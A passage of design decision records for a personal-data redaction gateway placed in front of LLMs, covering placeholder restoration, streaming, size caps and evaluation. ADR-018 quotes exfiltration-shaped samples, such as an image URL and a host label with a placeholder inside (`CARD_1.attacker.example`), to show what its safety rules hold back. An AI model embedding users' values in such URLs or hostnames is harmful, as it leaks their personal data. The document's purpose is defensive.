  minimum: npm only warns, the tests pass on it, and `nvm install 22.23.3`
  then `nvm use 22.23.3` fixes it.

**What we can and cannot guarantee:** Linux/Docker: the process-side
settings are enforced and verified at start-up; host-side dump handling is
only documented. Windows: no `/proc` and no SIGUSR1; Windows Error Reporting
can still write crash dumps if the host has `LocalDumps` configured, and a
process running as the same user can attach a debugger; the guard can only
warn, and production means Linux. Everywhere: strings cannot be wiped
(ADR-012).

---

<a id="adr-017"></a>

## ADR-017: Asking the model to keep placeholders verbatim (measured 2026-10-02: off by default)

**Context:** restoration only recognises the grammar in ADR-013. A model
that rewrites `[EMAIL_1]` as "email 1" leaves that value unrestored,
working against "the answer still reads naturally".

**Options considered:**

- A: no instruction; the prompt is exactly what the user wrote.
- B: a short system message, added first and only when the request
  contains a placeholder.
- **C: B behind `PSEUDONYM_PLACEHOLDER_INSTRUCTION`.**

**Decision:** C, default on, **provisional until Phase 5 measures rewrite
rates with it on and off.** The text (`src/gateway/instruction.ts`):
"Some values in this conversation were replaced with placeholders in square
brackets, such as [TYPE_N]. Whenever you mention one of those values, write
its placeholder exactly as it appears, brackets included."

- A separate first system message, so the user's own system message is
  untouched.
- Added only when the mapping has at least one entry (a real value or a
  LITERAL), so requests without personal data are sent exactly as written.
- Added after redaction, so its own text is never turned into a literal.
- Its example is `[TYPE_N]`, not a real namespace: a model echoing a
  real-looking example (`[EMAIL_1]`) would have a real value restored into
  the answer. Tested: `restore()` leaves the text unchanged even with every
  namespace assigned, and `detect()` finds nothing in it.

**Consequences:** about 40 extra tokens on requests with personal data;
possibly small changes in model behaviour, including occasionally
mentioning the redaction. The provider could already tell data was
redacted from the placeholders themselves, so nothing new is revealed.

**Amendment (2026-10-02, Phase 5d part 4): the measurement and its
decision rule, written down before any model call.**

- **Run.** One run, `qwen3:4b-instruct-2507-q4_K_M` on Ollama 0.35.0
  (CPU), 15 tasks × 2 conditions (instruction on, off) = 30 calls,
  temperature 0, one fixed seed, non-streaming, through the real pipeline
  (`parseChatRequest` → `redactRequest` → the Ollama adapter). Each task
  asks the model to repeat every value it was given (a reply, a form,
  a translation, a table, a log line…). Values are generated in memory
  from slots (ADR-009); a call is never made if a planted value is in the
  outgoing request. No thinking-model cross-check: `qwen3:4b` took 13.4
  minutes for one answer on this CPU (part 1), about 7 hours for 30.
- **Per value** (each placeholder the request carried), in the model's
  raw answer, the first that applies: **restored** (the restored answer
  contains the value); **held** (restored only with the safety rules
  off: the model put it in a URL, target or attribute); **rewritten** (the
  placeholder's tag and index with at most 3 other non-alphanumeric
  characters between them, any case: `Email 1`, `[EMAIL_:1]`, `CARD-1`);
  **dropped** (none of these). **Unrestored = rewritten + dropped.**
- **Invented:** placeholder-shaped text (`[WORD_N]`, `[WORD N]`, or a bare
  form restoration would read) whose tag and index the request's mapping
  does not hold.
- **Decision rule:** keep the instruction on, **unless** instruction-on
  leaves at least as many values unrestored as instruction-off, **or**
  invents more placeholders than instruction-off. Read literally, a tie,
  0 and 0 included, turns it off: an instruction that changes nothing is
  only cost. Held values are reported but are not part of the rule.
- The sample size (15 tasks, values per condition) is stated wherever
  the result is reported.

**Result (2026-10-02): the instruction is now off by default.** One run,
`qwen3:4b-instruct-2507-q4_K_M` (digest `0edcdef34593`), Ollama 0.35.0, CPU,
temperature 0, seed 20261002, at most 400 tokens; 30 calls, all finished
with `stop`, 2–21 s each. 15 tasks, **34 values per condition**
(`eval/model-rewrites.json`; code `scripts/measure-rewrites.ts`,
`eval/rewrites.ts`, `eval/rewrite-tasks.ts`).

| Condition       | Values | Restored | Held | Rewritten | Dropped | Invented |
| --------------- | ------ | -------- | ---- | --------- | ------- | -------- |
| Instruction on  | 34     | 30       | 0    | 0         | 4       | 0        |
| Instruction off | 34     | 32       | 2    | 0         | 0       | 0        |

By the rule: on leaves 4 unrestored, off 0, so **off**.
`PSEUDONYM_PLACEHOLDER_INSTRUCTION` now defaults to `false` (`env.ts`,
`.env.example`); the instruction itself is unchanged and can be switched
on. What the numbers rest on, read in all 30 answers:

- **All 4 dropped values are one task** (`csv`, instruction on): the model
  wrote the header and no data row. No other task left a value
  unrestored in either condition (the 2 held values are not unrestored),
  so **the decision rests on a single task out of 15**.
  It is kept as measured: the rule was fixed before the run, and a tie
  (which this would be without that task) also turns the instruction off.
- With the instruction off, the model often dropped the brackets
  (`"email": "EMAIL_1"`, table cells, the CSV row); the bare-underscore
  form of the restoration grammar (ADR-013) brought every one back. The
  instruction's job is done by the grammar on this model.
- No form outside the grammar appeared in either condition: 0 rewritten.
  The `[EMAIL_:1]` form was seen only in the thinking model's reasoning
  (part 1, below).
- The 2 held (instruction off, `code`): `API_KEY = "[SECRET_1]"` is a
  quoted value after `=`, which restoration safety reads as an HTML
  attribute. A cost of that rule on code that the echo set (ADR-033) does
  not contain. With the instruction on, the model wrote the same lines
  without quotes (not valid Python) and they restored.
- Not in the metric: with the instruction off, in the three-message chat,
  the model restored both values but said it "only received them as
  placeholders". Restored is not the same as natural.

**Not measured: the thinking model.** `qwen3:4b` (thinking-2507) took 13.4
minutes for one streamed answer on this CPU (part 1), about 7 hours for 30
calls, so there is no cross-check. Seen on it before the plan was approved
(2026-10-02): `think: false` still thinks; `reasoning_effort: "none"` puts
the reasoning into `content`, ending with a stray `</think>`, so the
reasoning would reach the user; and in the recorded stream (part 1) the
reasoning wrote `[EMAIL_:1]` once, a form restoration does not read (the
answer itself kept both placeholders exactly). A thinking model is
therefore not the demo model; `qwen3:4b-instruct-2507-q4_K_M` is
(`.env.example`, README).

---

<a id="adr-018"></a>

## ADR-018: Streaming restoration — rules decided from the left, one scanner, one restorer

**Context:** Phase 4 streams answers. The design promise is that the
restored stream equals `restore()` on the whole answer, holding back only a
small, fixed amount of text. Probing the Phase 2 rules (2026-09-29) showed
that was impossible with them: whether a placeholder was unsafe could
depend on text any distance _after_ it. `<img src="//a.example/?d= [AADHAAR_1]`
was restored, but the same text followed by a closing `"` fifty characters
later was not; the same for an unclosed `<` destination, and for
`Aadhaar 1.<300 characters>.example/`. The probe also found that the Phase
2 patterns take quadratic time on some inputs (bug-log 16).

**Options considered:**

- A: keep the rules and hold text until the closing character arrives.
  After one stray `="`, the rest of the answer would be held to the end.
- B: keep the rules, hold up to a cap, and leave the placeholder
  unrestored when the cap is hit. The stream would then sometimes differ
  from `restore()`; the property becomes "equal or more cautious".
- **C: change the rules so each is decided by the text on the left, plus at
  most two characters after a placeholder; every change strictly more
  cautious than Phase 2.**

**Decision:** C (approved 2026-09-29), with two refinements approved the
same day (quoted values read left to right; the host rule for bracketed
forms only after "."). The rule changes:

1. An unclosed quoted HTML value (`="…`, `='…`) runs to the end of the
   text (Phase 2: only once the closing quote arrived). Values are read
   left to right, as before: an `=` inside an open value starts nothing.
   Counting every `="` was rejected when a probe showed its cost: the
   closing quote of `href="…?ref="` or of base64 padding (`="aGVsbG8="`)
   would open a value that never closes, and every placeholder after it
   would stay unrestored.
2. An unclosed `<` destination (after `](` or `[label]:`) runs to the end
   of the line (Phase 2: to the first whitespace).
3. Every `](` and every `[` counts, even inside an earlier destination or
   label. Read left to right, a `](` inside an unclosed `<` destination
   would be skipped, and its own destination (which can start on a later
   line) missed, where Phase 2 caught it.
4. The host rule: a placeholder followed by what would make its value the
   first label of a hostname stays unrestored. Bare forms (`Aadhaar 1`,
   `CARD_1`) count before "." or "-" and a letter, digit or "-"; bracketed
   forms only before "." and one of those, since `[PAN_1]-linked` is
   ordinary prose. Phase 2 marked `Aadhaar 1.a.example/` only once the
   whole `host/` had arrived (up to 253+ characters later), and never
   marked the underscore or bracketed forms, which browsers accept as host
   labels too (`CARD_1.attacker.example`).

Everything else was already decided from the left. A placeholder can only
overlap a region that started before it; the one region that can start
inside a placeholder is a bare host starting at the index digits of
`Aadhaar 1`, which rule 4 covers.

**Implementation:**

- `unsafe-regions.ts` is a left-to-right scanner (`UnsafeRegionScanner`)
  with a small fixed state, not five regular expressions. Fixed work per
  character, so it is linear (fixes bug 16). `unsafeRegions(text)` keeps its
  API. A URL's scheme and a bare URL's host are marked once the `://` or `/`
  after them arrives; neither can contain a placeholder.
- `StreamRestorer` (`restore.ts`) takes the answer in pieces. It gives back
  everything up to the earliest point where the end of the text could
  still become a placeholder, or is one whose decision needs more text
  (`undecidedFrom`, `variants.ts`, built from the same pieces as the
  matching patterns, ADR-002). It decides each placeholder after feeding
  the scanner up to that placeholder's end.
- `restore(text)` is one `push(text)` plus `end()`: one implementation, so
  streamed and non-streamed answers cannot drift apart.
- **The hold bound, `MAX_HELD_BACK` = 15 UTF-16 code units:** the longest
  bracketed placeholder, `[AADHAAR_9999]` (14), plus the "." after it,
  while waiting for the character that decides the host rule. Derived from
  the namespace list, so a longer tag raises it by itself. Other cases hold
  less: a bare form waiting to see whether the next character glues it to
  a longer token (`AADHAAR_1234` + one more, 13 with a high surrogate), a
  bare form and "." (13). `[CARD_1` waits for the next character, so
  `[CARD_1` + `0]` restores `[CARD_10]`, never `[CARD_1]` + `0]`. A lone
  high surrogate at the end is always held, so no output splits a
  character. The proposal said 13; rule 4 for bracketed forms added two.

**Consequences:**

- Phase 2 cases all behave as before. New costs, all "a value stays a
  placeholder", never a leak: after an unclosed `="` or `='`, every later
  placeholder; after an unclosed `<` destination, the rest of its line;
  `Aadhaar 1.5`, `CARD_1-x`, `[CARD_1].com`. Phase 5 measures how often
  restoration is suppressed.
- Tested three ways (testing guide, Phase 4a): the scanner's regions equal
  the rules written as regular expressions (`test/support/restore-reference.ts`,
  the "oracle"); `restore()` equals the oracle's restore; streaming equals
  `restore()` for random texts and random cuts; and a copy of the Phase 2
  regular expressions checks that no placeholder they left alone is
  restored now.
- New known gap, same category as the other bare-host gaps (plain text, not
  fetched automatically): a value glued to the _end_ of a host label,
  `x-[CARD_1].example/`.
- Speed (dev machine, 2026-09-29): restoring 1 MiB takes 23 ms for prose and
  85 ms for placeholder-heavy text; streamed in 4-character pieces, 0.44 s
  and 0.55 s (fixed overhead per piece). A model takes minutes to write
  1 MiB, so the stream never waits on restoration.

---

<a id="adr-019"></a>

## ADR-019: The streaming endpoint — server-sent events, errors, timeouts

**Context:** Phase 4a built `StreamRestorer`. Phase 4b puts it behind
`stream: true`: Ollama's stream has to be read, restored and passed on in
OpenAI's format. The questions were where a failure can still be an HTTP
error, what a client sees when the provider fails half way, how a timeout
applies to an answer that arrives over minutes, and how to parse
server-sent events. Designed in the Phase 4 proposal (2026-09-29) and
approved with it.

**Decision:**

- **Parsing:** a hand-written parser (`src/providers/sse.ts`, about 60
  lines of logic) following the WHATWG algorithm, not a dependency
  (`eventsource-parser` was the alternative; rule 7). It works on bytes:
  CR and LF never occur inside a UTF-8 multi-byte sequence, so lines split
  on bytes can never cut a character, and each complete line is decoded
  on its own. An event the stream ends in the middle of is never
  dispatched.
- **Where the HTTP status is decided:** `ChatProvider.stream()` resolves
  only once the provider has answered 200 with `text/event-stream` and
  sent a first chunk we can use (it carries the `id` and `created` every
  chunk repeats). Everything before that (a provider error status, no
  first chunk in time, a first chunk that is not JSON, an error event, a
  JSON body instead of a stream, a declared length over the cap) is a
  rejection, and the client gets an ordinary HTTP error from the error
  handler, with the same codes and fixed messages as without streaming.
- **The stream:** OpenAI's `chat.completion.chunk` shape with our model
  name: a role chunk; one chunk per piece of text the restorer has decided
  (none for a piece that decides nothing); at the end the held-back text
  and a `delta: {}` chunk with `finish_reason`; then `data: [DONE]`. With
  `include_usage`, every chunk carries `usage: null` and a last
  `choices: []` chunk carries the usage (OpenAI's documented form);
  `stream_options` is forwarded to Ollama only then.
- **What ends a stream successfully:** `[DONE]` after exactly one finish.
  Ollama's source (`middleware/openai.go`, read 2026-09-29, since the docs
  do not show the stream) shows that a failure after the first chunk is
  not an error event: the status is already 200, the error JSON goes
  through the chunk writer, and the stream ends without `[DONE]`. So a
  stream that ends before `[DONE]`, or reaches it without a finish, is a
  failure (`bad_response`), never a short answer. An OpenAI-style
  `data: {"error": …}` event is a failure too (`stream_error`: 502
  `provider_error`, "the provider reported an error during the stream").
  Content after the finish, usage before it or twice, a tool call, or
  `finish_reason: tool_calls` are `bad_response`.
- **A failure after the start:** the restorer's held-back text (at most 15
  characters of what the model really wrote) is restored as at the end of
  an answer and sent, then one `data: {"error": …}` event with the same
  body an HTTP error would have, and no `[DONE]`. OpenAI's SDKs raise an
  `error` event as an exception; a client that only waits for `[DONE]`
  sees the stream end without it. Flushing is safe: it is text the model
  wrote, decided by exactly the rules `restore()` uses at the end of a
  text.
- **Timeouts:** `PSEUDONYM_PROVIDER_TIMEOUT_MS` applies to every wait when
  streaming: the headers, then each read of the body. A read that resolves
  resets the clock, and the clock only runs while a read is pending, so a
  slow client (backpressure) does not count against the provider.
  Non-streaming keeps one deadline for the whole call: Ollama sends
  nothing until it is done, so a per-wait timeout gains nothing there, and
  one deadline stops a provider that drips bytes.
- **Client abort:** as in Phase 3, the response's `close` aborts the
  provider call; the pending read fails, the stream ends, and the upstream
  connection is closed. Logged at info as "stream ended: client left", not
  as a failure. A consumer that stops reading early also releases the
  upstream body.

**Consequences:**

- A client can receive a 200 that ends in an error. That is inherent in
  streaming; the error event and the missing `[DONE]` say so, and the
  README documents it.
- No total time limit on a stream that keeps arriving: a provider sending
  a byte just inside every timeout could hold a stream open for a long
  time. The response size cap (ADR-020) bounds how much it can send, and
  the client can always disconnect.
- The adapter is strict about Ollama's order. Another provider (Phase 7)
  that sends usage before the finish needs its own adapter logic; the
  gateway's contract (`ProviderStream`) stays the same.
- The stream format was built from Ollama's source and tested against a
  mock that writes it the same way. A recorded fixture from a running
  Ollama is a follow-up (Ollama was not installed on 2026-09-29).
  **Done 2026-10-02 (Phase 5d part 1):** a real stream from Ollama 0.35.0
  (`qwen3:4b`, a thinking model) is in `test/fixtures/` and has exactly
  this shape (reasoning chunks send `"content":""`; the finish chunk's
  delta is `{}`); parser, adapter and gateway pass on it
  (`ollama-recorded-stream.test.ts`).

---

<a id="adr-020"></a>

## ADR-020: Response size caps — 1 MiB, and 32 MiB for streams

**Context:** the provider's answer is text the model writes, and a
prompt-injected or broken provider can make it as long as it likes. Phase 3
read the whole body with `response.text()`: unbounded memory, then a parse
and a restore over all of it.

**Decision (approved in the Phase 4 proposal, 2026-09-29):**
`PSEUDONYM_MAX_RESPONSE_BYTES`, default 1,048,576, for both paths
(`src/providers/body.ts`; streams got their own cap the next day, see the
amendment):

- a declared `Content-Length` over the cap fails before a byte is read;
- every byte actually read is counted, since a chunked response declares
  nothing; one byte over fails;
- when streaming, one event may be at most `MAX_EVENT_BYTES` = 64 KiB
  (Ollama's chunks are about 200 bytes), so no single line or event is
  buffered up to the whole cap.

Over the cap is `too_large`: 502 `provider_response_too_large`, "the
provider response was larger than the response size limit", before the
stream starts, or as the error event after.

**Consequences:**

- Memory per non-streamed request is bounded by the cap; per streamed
  request by 64 KiB of parser buffer plus 15 held-back characters.
- **Open issue (found while building it, 2026-09-29; resolved
  2026-09-30, see the amendment):** the cap counts bytes on the wire, and
  a streamed token costs far more than its text. Each Ollama chunk repeats
  the id, object, created, model, fingerprint and choice wrapper, so 1 MiB
  is about 5,000 streamed tokens, while the same 1 MiB holds a
  non-streamed answer of roughly 250,000 tokens. Thinking models stream
  their reasoning tokens as chunks too, and those count. The options
  were: keep it; a separate, larger default for streams; or count only
  the answer text when streaming, with a much larger wire cap behind it.

**Amendment (accepted 2026-09-30): a separate cap for streams,
`PSEUDONYM_MAX_STREAM_BYTES`, default 33,554,432 (32 MiB).** Option 2.
`complete()` keeps `PSEUDONYM_MAX_RESPONSE_BYTES` (1 MiB); `stream()`
uses the new cap for both checks (the declared length and the bytes
read). Neither cap applies to the other call. The per-event cap stays
64 KiB, and the error is the same (`too_large`, 502
`provider_response_too_large` or the error event).

_Why a second number and not one bigger one:_ the two caps bound
different things. A non-streamed response is held in memory whole, then
parsed and restored in one go, so its cap is a memory and event-loop
bound and should stay small. A stream is never held whole: memory is
bounded by one event (64 KiB) plus 15 held-back characters whatever the
total, so the stream cap only bounds how much work and bandwidth one
request can take. Raising one cap for both would have allowed a 32 MiB
non-streamed body in memory.

_Why not option 3 (count only answer text):_ reasoning is dropped by the
adapter, so a cap on answer text alone would let a model reason without
limit; it would need the wire cap as well, which is two counters and two
settings for streams where one does the job.

_The measurement the default comes from (2026-09-30)._ Ollama is not
installed, so this is computed from the bytes Ollama's code writes
(`openai/openai.go` `toChunk` and `middleware/openai.go`, read on main
the same day; latest release v0.35.0), one token per chunk, encoded the
way Go's `json.Marshal` does (`<`, `>`, `&` as `<`…, non-ASCII as
UTF-8). Not a recorded stream: that is still the Phase 4b follow-up.

- An answer chunk is **195 bytes + the model name + the token**:
  `data: {"id":"chatcmpl-123","object":"chat.completion.chunk","created":…,"model":"…","system_fingerprint":"fp_ollama","choices":[{"index":0,"delta":{"content":"…"},"finish_reason":null}]}`
  and a blank line. (The id is `chatcmpl-` plus a number under 999.)
- A reasoning chunk is **210 bytes + the model name + the token**: the
  delta is `{"content":"","reasoning":"…"}`. On main a reasoning-only
  chunk carries an explicit empty `content`; the adapter accepts that and
  a missing `content` alike, and both are tested.
- **Checked 2026-10-02 against a real stream** (Ollama 0.35.0,
  `qwen3:4b`, 2,335 tokens, 516,575 bytes, 221 bytes per token): 209 and
  194 bytes + model name + token, one less than above because that
  stream's id had two digits (`chatcmpl-50`). The computation holds.
- The token itself is a few bytes, so the envelope is 94 to 98% of every
  chunk and the result barely depends on the tokenizer. No tokenizer was
  used: the token texts are hand-picked samples of three kinds.

| Token text (average bytes per token, escaped)      | Model name                    | Bytes per answer chunk | 32,768-token answer | Plus 32,768 reasoning tokens |
| -------------------------------------------------- | ----------------------------- | ---------------------- | ------------------- | ---------------------------- |
| English prose (3.6)                                | `qwen3:8b` (8 characters)     | 206.6                  | 6.46 MiB            | 13.38 MiB                    |
| English prose (3.6)                                | a 46-character `hf.co/…` name | 244.6                  | 7.64 MiB            | 15.76 MiB                    |
| Hindi in Devanagari (12.5; 3 bytes per character)  | 8 characters                  | 215.5                  | 6.73 MiB            | 13.94 MiB                    |
| Hindi in Devanagari (12.5)                         | 46 characters                 | 253.5                  | 7.92 MiB            | 16.31 MiB                    |
| Code and HTML (4.3; quotes, newlines, `<` `>` `&`) | 8 characters                  | 207.3                  | 6.48 MiB            | 13.42 MiB                    |
| Code and HTML (4.3)                                | 46 characters                 | 245.3                  | 7.67 MiB            | 15.80 MiB                    |

So a 32,768-token answer is 6.5 to 7.9 MiB on the wire, and with as
many reasoning tokens before it 13.4 to 16.3 MiB. The reasoning budget
(as much thinking as answer) is an assumption, not a measurement: in
Ollama both count against the same context window, so 65,536 generated
tokens already needs a window larger than 64k.

_Default:_ 32 MiB, the smallest power of two that holds every row. 16 MiB
holds the common case with 16% to spare but not the last Hindi row
(16.31 MiB), and a default that fails at exactly the size it was chosen
for would be the old problem again. 32 MiB is about 160,000 streamed
tokens for `qwen3:8b` and about 130,000 in the worst row.

**Consequences of the amendment:**

- A long streamed answer, thinking included, no longer ends in an error
  event at about 5,000 tokens.
- One request can now make the gateway read 32 MiB. That is not memory
  (see above). As work: the adapter read and parsed a 14.03 MiB stream of
  65,537 chunks in about 0.7 s in a test (dev machine, adapter only, the
  restorer not included; ADR-018 measured restoring 1 MiB cut into
  4-character pieces at about 0.5 s), in small steps between reads, so
  other requests are still served.
- A stream still has no total time limit (ADR-019): a provider that
  drips bytes just inside the per-wait timeout is bounded only by this
  cap, which is now 32 times further away. The client can disconnect.
- Non-streamed reasoning (`message.reasoning`) counts against the 1 MiB
  cap. At about 4 bytes per token that is still some 250,000 tokens.
- The default is pinned by `env.test.ts`; an adapter test streams the
  64k-chunk case under the default, and shows the old 1 MiB cutting it
  off before the answer starts. Which variable feeds which setting is in
  `src/config/wiring.ts` and under test since the follow-up of the same
  day (swapping the two caps fails `wiring.test.ts`); before that it sat
  in `main.ts`, untested.

---

<a id="adr-021"></a>

## ADR-021: Evaluation — two datasets, slots instead of values, exact counts as thresholds

**Context:** the promise ends with "how much Pseudonym detects is measured
and published, per data type". Phase 5 builds that measurement. Three
things make it hard to do honestly: the generator and the detectors share
an author; ADR-009 forbids personal-looking values in files, and a
dataset written as cases lives in a file; and a threshold that is set loosely
enough to survive noise also survives small regressions.

**Decision (proposal accepted 2026-09-30, with the user's six answers):**

1. **Two datasets, reported separately.**
   - _Generated_ (`eval/generate.ts`): 600 messages in 500 cases from seed
     20260930, built in memory on every run. 210 support tickets, 150
     emails, 90 pasted records, 50 chats of 3 messages; 50% English, 30%
     Hinglish, 10% Hindi, 10% mixed; 120 messages (one in five) with no
     personal value; each of the 11 types planted exactly 153 times, so
     every type weighs the same; lookalikes labelled by kind (order,
     tracking, invoice, ticket, OTP, 12-digit reference in the Aadhaar
     grouping, 16-digit transaction id, timestamp, PAN-shaped product code,
     version like an IP, date-time, private IP, loopback).
   - _Held-out_ (`eval/held-out.txt`): about 80 cases written by hand by
     the user, who did not write the detectors. **[Corrected 2026-09-30:
     this was the plan, not what happened. The set has 54 cases and was
     drafted with AI assistance in a separate session, then reviewed by
     the user; see the amendment at the end of this ADR.]** Committed
     before the Phase 5 detectors exist. Never used for tuning: the author of the
     detectors does not read the file (a `Read` deny rule in
     `.claude/settings.json`, and tools that print case ids, lines, rule
     names and counts only). If a case ever leads to a detector change it
     is moved to a "burned" list, left out of the numbers, and the README
     says how many.
2. **Slots instead of values** (`eval/slots.ts`, `render.ts`,
   `HELD-OUT-FORMAT.md`). A case says `{{AADHAAR:#### #### ####}}`; the
   value is generated in memory from the dataset seed and the case id, and
   a label records where it landed. A mask lays the value out (each `#`
   takes its next character), `!` gives a typo, `@name` continues one value
   in a later slot or message, `|modifier` writes it in another script,
   with invisible characters, or in another case. `NOT` marks a lookalike
   that is not personal. A few types may be typed (`=`), only where the
   text cannot be anybody's: reserved email domains, documentation /
   private / loopback IP ranges, fictional phone ranges, published test
   cards, names. The generated dataset is written with the same slots and
   rendered by the same code.
3. **A lint before anything is used** (`eval/lint.ts`), written without
   the detectors so that passing or failing tells the author nothing about
   them. Typed text may hold at most 8 digits in one stretch (any script;
   counted across up to three of space, dot, hyphen, dash, bracket, `+`);
   no PAN shape; no `@` between two characters outside a slot (the user's
   rule, made stricter: even a reserved-domain address must be in a slot,
   since outside one it would be labelled "not personal"); no key-shaped
   prefix. UPI IDs and secrets are never typed: a typed UPI ID could be a
   real one, and a key-shaped string can get a push blocked by GitHub
   secret scanning.
4. **Scoring** (`eval/score.ts`). A value is _redacted_ when every one of
   its own characters is inside some detection of any type (separators and
   fixed text such as `+91` need not be); one character out makes it
   _partly redacted_, which is reported and not counted as redacted. It is
   _typed_ when each piece is inside one detection of its own type.
   Precision, recall and F1 are for the right type; _over-redactions_ are
   detections covering nothing personal, broken down by lookalike kind.
   Percentages are cut, never rounded up.
5. **Thresholds are the exact counts of the last accepted run**
   (`eval/baseline.json`, `eval/baseline.ts`), on three counts per type and
   dataset: redacted, redacted with the right type, over-redactions. Both
   datasets are deterministic, so a moved count is a real change and needs
   no margin. `npm run eval` fails if any count is worse; it also fails if
   one is better, until `--update` moves the floor, so the file and the
   README never lag. A worse count, or a dataset that changed shape, is
   accepted only with `--accept "ADR-0xx: why"`, and the note and the
   changed counts are kept in the history inside the file. The results
   block in the README is generated from the baseline, and the run fails if
   it is stale.
6. **The held-out set is scored from its first measurement on**
   (`--update --with-held-out`), not while it is being written. After
   that, editing the file changes the dataset and needs a note.
7. **Detectors in 5b:** secrets (known formats plus keyword assignment; no
   entropy scanning), then UPI, IFSC, and one `IP` type for v4 and v6
   (amends the separate IPv6 > IPv4 of ADR-003: the longer-span rule covers
   an IPv4 inside an IPv6). Decided by measurement there: whether private
   and loopback addresses are redacted, and how version strings that are
   also valid addresses (four parts of 0–255) are kept out (the generated
   set labels both).
8. **Parts:** 5a (this), 5b detectors, 5c the open detection decisions
   (line breaks, neighbours merged by widening, the ADR-003 containing
   span), 5d restoration measurements with a running Ollama, the ADR-017
   default, final numbers, **and CI**. CI arrives in 5d, not Phase 8
   (user, 2026-09-30), and GitHub runners are small shared machines, so
   before the workflow goes in the growth-ratio tests must be made
   reliable under load (for example their own sequential project, not run
   in parallel with the rest), with stability runs to prove it (bug-log 21,
   "also seen").

**Options considered and rejected:**

- _The held-out set as a TypeScript file_ (the first proposal). A typo in
  it makes `tsc` and the bundler print the offending source line, which
  would show the cases to the author of the detectors. A plain-text file
  is read only by our parser, whose messages never quote it, and needs no
  escaping.
- _Thresholds with a margin._ Pointless without noise, and a margin hides
  a regression as large as itself.
- _A validator-based lint_ (reject a typed number if it is a valid
  Aadhaar, card or phone). It would tell the author what the detectors
  see. The structural 8-digit rule tells them nothing, at the price of
  making them write a long non-personal number as a slot.
- _Detecting values split across two messages._ Not done, by design:
  appending a message could change how an earlier one was redacted, which
  breaks "appending never renumbers". The gap is labelled in the held-out
  set and its recall published.

**Consequences:**

- The numbers in the README come from one command and cannot drift: the
  block is generated and checked.
- The generated set mostly measures regressions; the README says so. The
  first baseline (2026-09-30, the five detectors plus the safety net):
  redacted 151/153 Aadhaar, 149/153 card, 139/153 PAN, 153/153 phone,
  153/153 email, 128/153 other numbers; nothing for IFSC, UPI, secrets and
  names, and 71/153 IPs (by the existing number detectors). Over-redactions:
  86 by the phone detector and 112 by the safety net, all on labelled
  lookalikes; none on plain text (dates, amounts).
- `src/synthetic/identifiers.ts` has generators for IFSC, UPI IDs, IP
  addresses, eleven kinds of secret, names and the typo variants, written
  before their detectors. ADR-009 extends to them; key-shaped strings are
  assembled at run time and never appear whole in a file.
- The evaluation code is under the same 100% coverage as `src` (the two
  CLI entry points excluded, as `main.ts` is).
- The test that lints `eval/held-out.txt` runs in the ordinary suite, so a
  problem in that file fails the build with a case id, a line and a rule.

**Amendment (2026-09-30, before 5b): how the held-out set was really made,
what may be printed about it, and what its format cannot say.**

- _Provenance, stated exactly._ The decision above says "written by hand
  by the user". That is not what happened. The set (54 cases, 58 messages,
  79 labelled values) was **drafted with AI assistance in a separate
  session that did not write the detectors, and then reviewed by the
  user**. It is blind: no case was run against the detectors before the
  set was committed (`c6d76b1`), and the first measurement was committed
  after it (`b14f72b`). It is never used for tuning. The README, rule 1 of
  `eval/HELD-OUT-FORMAT.md`, the generated README block (`eval/report.ts`)
  and the code comments now say this, and none of them says "hand-written"
  or "by someone else": a reader must not be left thinking a person typed
  the cases. What the separation still buys: the drafting session had no
  access to the detectors' code or output, so the cases were not shaped by
  what the detectors happen to catch. What it does not buy: two AI-assisted
  sessions may share blind spots that a human author would not, so the set
  is weaker evidence than one written by an independent person. The numbers
  stay published as they are, with that description beside them.
- _Tuning rule, made stricter._ The session that works on the detectors
  never tries to find out which held-out cases fail: no per-case output, no
  per-tag output, no bisecting by editing detectors and watching a count.
  Detectors are tuned on the generated set only; the held-out tables are
  read after a detector is finished.
- _What the tools print._ Checked before 5b: tests, the lint and the
  evaluation printed case ids, line numbers, rule names and counts, **and
  two more things that are text from the file**: tag names (`eval:lint`'s
  summary, `--by-tag`) and the labels of `NOT` slots (the held-out
  over-redaction table). Both are now off by default. `npm run eval` folds
  the held-out lookalikes into one `lookalike` row
  (`overRedactionTable(score, 'hidden')`); `eval:lint` prints the number
  of distinct tags. The author's flags still show them: `--tags`, `--show
ID` (`eval/check-held-out.ts`) and `--by-tag` (`eval/run.ts`). The
  generated set is unaffected: its labels are the generator's own.
- _PowerShell._ `npm run eval -- --update` does not work in PowerShell,
  which drops the `--`, after which npm takes `--update` for itself. Every
  command with a flag is now written `npx tsx eval/run.ts --update …`
  (docs, comments and the messages the run prints). `npm run eval` and
  `npm run eval:lint` without flags are unchanged.
- _Format gaps (for 5d; not built)._ The slot format cannot express: a
  number written in words ("nine eight seven…"); letters standing in for
  digits in scanned text (O for 0, l for 1); a postal address; a vehicle
  registration number. None of them can be labelled, so none is measured,
  and the README says so. Adding them means new slot types or modifiers
  and changes the dataset (a note in the baseline history).
- _Known gap the first held-out measurement shows (user's reading of the
  file, not mine)._ NUMBER 3/6: the safety net needs 9 digits (ADR-011),
  so short personal identifiers are missed: 7-digit passport and voter ID
  numbers, dates of birth. Recorded as a known gap in the README. Not
  tuned for: lowering the 9 would take dates and amounts (measured in
  ADR-011), and a detector for those identifiers would be written from a
  held-out result. If one is ever wanted it starts from the documents'
  published formats and the generated set, and the held-out cases it was
  prompted by are burned (rule 3).

**Amendment (2026-10-01, ADR-026): item 7 done.** One `IP` type. Private,
loopback and documentation addresses decided by measurement (ADR-026 item
4: every address redacted except those no single host owns); versions
kept out only when a version word is right before them (a bare one is
redacted). The generated set gained IP written with a port, a prefix
length, in a URL and in brackets, and nine lookalike kinds (link-local,
version-build, app-version, time, date, mac, eui-64, then netmask and
multicast), in two dataset steps each measured with the detectors
unchanged. `isSafeIp` (the lint's rule for typed addresses) also accepts
the ranges no single host owns and an IPv4 address carried in IPv6;
`HELD-OUT-FORMAT.md` says so, and `repo-hygiene.test.ts` now uses the same
rule for every file except the held-out one.

**Amendment (2026-10-01, Phase 5c step 0): the shape block.** The 5c
proposal measured every option on probes built outside the dataset,
because the generated set contained none of the 5c shapes (no option moved
any of its counts). Before any 5c detector change, the generated set gains
a **shape block**: 591 cases (651 messages) after the 500 main ones, each
tagged `shape:<name>`, with its own random stream (seed XOR `0x5c5c5c5c`),
so that the 500 main cases render byte for byte as before (checked against
HEAD by hash). Shapes and planted values: `line-break` 120 (40 each of
Aadhaar, card, phone; LF and CRLF, inside a group, after a separator,
typos), `message-split` 60 (one value in two consecutive user messages),
`side-by-side` 80 (40 pairs joined by a space, `-`, `. ` or `-`),
`digit-beside` 40 (bug-log 32 and 34 shapes, plus forms that work today as
regression guards), `contained` 70 (an email or UPI ID starting with a
